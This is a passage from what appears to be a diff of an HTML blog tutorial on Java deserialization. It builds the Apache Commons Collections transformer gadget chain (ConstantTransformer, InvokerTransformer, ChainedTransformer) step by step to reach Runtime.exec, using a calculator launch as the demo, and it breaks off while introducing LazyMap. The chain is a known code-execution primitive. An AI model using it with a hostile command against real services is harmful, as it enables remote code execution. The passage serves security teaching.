+</span><span class='line'>            <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">t</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">h</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Dashboard</span> <span class="n">d</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Dashboard</span><span class="o">(</span><span class="mf">23.9</span><span class="o">,</span> <span class="mi">8000</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Class</span> <span class="n">cls02</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">t</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">d</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cls02</span><span class="o">);</span>  <span class="c1">// both cls and cls02 is same</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// we can perform command execution using reflection concept</span>
+</span><span class='line'>            <span class="n">Method</span> <span class="n">m</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&quot;getRuntime&quot;</span><span class="o">);</span> <span class="c1">// examine method dynamically</span>
+</span><span class='line'>            <span class="c1">// similar to Runtime r = (Runtime) Runtime.getRuntime();</span>
+</span><span class='line'>            <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>  <span class="c1">// executing the method to get a Runtime object</span>
+</span><span class='line'>            <span class="c1">// arg 1 =&gt; static class function -&gt; null is passed instead of object</span>
+</span><span class='line'>            <span class="c1">// arg 2 =&gt; null means no argument</span>
+</span><span class='line'>            <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Initializing a <code>ConstantTransformar</code> with <code>Runtime.class</code> so that we can call the <code>transform()</code> method with any object and expecting <code>Runtime.class</code> returns type.</p>
+
+<h3>InvokerTransformer</h3>
+
+<ul>
+<li>It takes a <code>method name</code> with optional parameters during initialization.</li>
+<li>On <code>transform,</code> calls that <code>method</code> for the <code>object</code> provided with the parameters.</li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept05</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// concept of InvokerTransformer</span>
+</span><span class='line'>            <span class="n">Dashboard</span> <span class="n">d</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Dashboard</span><span class="o">(</span><span class="mf">23.9</span><span class="o">,</span> <span class="mi">8000</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">d</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;toString&quot;</span><span class="o">,</span>  <span class="c1">// method name</span>
+</span><span class='line'>                    <span class="kc">null</span><span class="o">,</span>  <span class="c1">// toString() parameter types</span>
+</span><span class='line'>                    <span class="kc">null</span>  <span class="c1">// toString() argument</span>
+</span><span class='line'>            <span class="o">);</span>
+</span><span class='line'>            <span class="c1">// invoke the toString() method of Dashboard object via InvokerTransformer&#39;s transform() method</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">out</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">t</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">d</span><span class="o">);</span>  <span class="c1">// on `transform`, calls that toString() for the Dashboard object</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">out</span><span class="o">);</span>  <span class="c1">// same as d.toString()</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Invoke the <code>toString()</code> method of a Dashboard object via <code>InvokerTransformer.</code></p>
+
+<p>While initializing the <code>InvokerTransformer,</code> we need to install a method by supplying method_name, argument_type, and argument.</p>
+
+<p>We can&rsquo;t install any arbitrary method here. The method should be present in the same class whose object we are going to pass on the transform() method.</p>
+
+<h3>Command Execution by <code>combining</code> reflection API, ConstantTransformer and InvokerTransformer</h3>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept06</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// combining the concept of reflection API, ConstantTransformer and InvokerTransformer</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// equivalent code: Class&lt;Runtime&gt; cls = Runtime.class;</span>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t0</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;any_key&quot;</span><span class="o">;</span> <span class="c1">// we trigger with any Object by passing to the transform() method</span>
+</span><span class='line'>            <span class="n">Class</span> <span class="n">r0</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">t0</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">);</span> <span class="c1">// transform() returns a reflection Object of java.lang.Runtime class</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;object type: &quot;</span> <span class="o">+</span> <span class="n">r0</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot; | but basically it points to &quot;</span> <span class="o">+</span> <span class="n">r0</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// equivalent code: Method m = cls.getMethod(&quot;getRuntime&quot;);</span>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;getMethod&quot;</span><span class="o">,</span>  <span class="c1">// method name</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}</span>
+</span><span class='line'>            <span class="o">);</span>
+</span><span class='line'>           <span class="n">Method</span> <span class="n">m</span> <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span> <span class="n">t1</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">r0</span><span class="o">);</span>
+</span><span class='line'>           <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">m</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// equivalent code: Runtime r = (Runtime) m.invoke(null,null);</span>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t2</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;invoke&quot;</span><span class="o">,</span>  <span class="c1">// method name</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}</span>
+</span><span class='line'>            <span class="o">);</span>
+</span><span class='line'>            <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">t2</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">m</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">r</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// equivalent code: r.exec(&quot;/usr/bin/gnome-calculator&quot;);</span>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t3</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;exec&quot;</span><span class="o">,</span>  <span class="c1">// method name</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">}</span>
+</span><span class='line'>            <span class="o">);</span>
+</span><span class='line'>            <span class="n">t3</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// most compact format:</span>
+</span><span class='line'>            <span class="n">t3</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">t2</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">t1</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">t0</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">))));</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Open the <code>gnome-calculator</code> by chaining three transformers and executing the <code>transform()</code> method.</p>
+
+<h3>ChainedTransformer</h3>
+
+<ul>
+<li>Shorten/compact the code for code execution.</li>
+<li><strong>Key Point:</strong> Takes an <code>array of transformers</code> during initialization and <code>chains</code> them carefully maintaining their execution order.</li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept07</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>           <span class="c1">// concept of ChainedTransformer</span>
+</span><span class='line'>            <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">}),</span>
+</span><span class='line'>            <span class="o">};</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;any_key&quot;</span><span class="o">;</span> <span class="c1">// we trigger with any Object by passing to the transform() method</span>
+</span><span class='line'>            <span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>  <span class="c1">// during the creation of the object in the memory the code execution occurs</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<blockquote><ul>
+<li><p>In order to trigger the command execution, somehow we need to execute <code>ChainedTransformer.transform("any_key")</code> method.</p></li>
+<li><p>However, we still need to understand a few more data structures to connect the dots.</p></li>
+</ul>
+</blockquote>
+
+<h3>HashMap</h3>
+
+<blockquote><p><strong>public</strong> <strong>class</strong> HashMap&lt;K,V> <strong>extends</strong> AbstractMap&lt;K,V> <strong>implements</strong> Map&lt;K,V>, Cloneable, Serializable</p></blockquote>
+
+<ol>
+<li>HashMap class contains <code>values</code> based on the <code>key</code>.</li>
+<li>Contains only unique <code>keys</code>.</li>
+<li>Maintains no order.</li>
+<li><strong>Key Point:</strong> Returns <code>null</code> if there’s <code>no</code> value is present for the requested <code>key</code>.</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept08</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding HashMap</span>
+</span><span class='line'>            <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;</span> <span class="n">h</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>            <span class="c1">// Map&lt;String, Integer&gt; h = new HashMap&lt;String, Integer&gt;();  // we can write this also</span>
+</span><span class='line'>            <span class="n">h</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;asinha&quot;</span><span class="o">,</span> <span class="mi">9</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">h</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;bob&quot;</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+</span><span class='line'>            <span class="c1">// inspect  the HashMap object status</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;bob&quot;</span><span class="o">));</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;alice&quot;</span><span class="o">));</span> <span class="c1">// returns null when NO key is found</span>
+</span><span class='line'>            <span class="c1">// inspect the HashMap object status</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">h</span><span class="o">);</span>  <span class="c1">// note: when No Key is found, it does not generate any value / add the entry</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h3>LazyMap</h3>
+
+<ol>
+<li>A type of <code>Map</code> which <code>creates</code> a <code>value</code> if there’s <code>no</code> value is present for the <code>requested</code> key.</li>
+<li>This <code>generation</code> is done through a <code>transformation</code> (i.e transformer.<code>transform()</code> method) on the requested <code>Key</code>.</li>
+<li><strong>Key Point:</strong> <code>lazyMap.get("invalid_key")</code> calls <code>transformer.transform("invalid_key")</code> method when the key is not found.</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept09</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding LazyMap</span>
+</span><span class='line'>            <span class="c1">// HashMap implements the Map interface so we can create Map type object also</span>
+</span><span class='line'>            <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;</span> <span class="n">dict</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>            <span class="n">dict</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;asinha&quot;</span><span class="o">,</span> <span class="mi">9</span><span class="o">);</span>  <span class="c1">// add an entry</span>
+</span><span class='line'>            <span class="n">dict</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;bob&quot;</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>  <span class="c1">// add another entry</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// method definition =&gt; decorate(Map map, Transformer factory)</span>
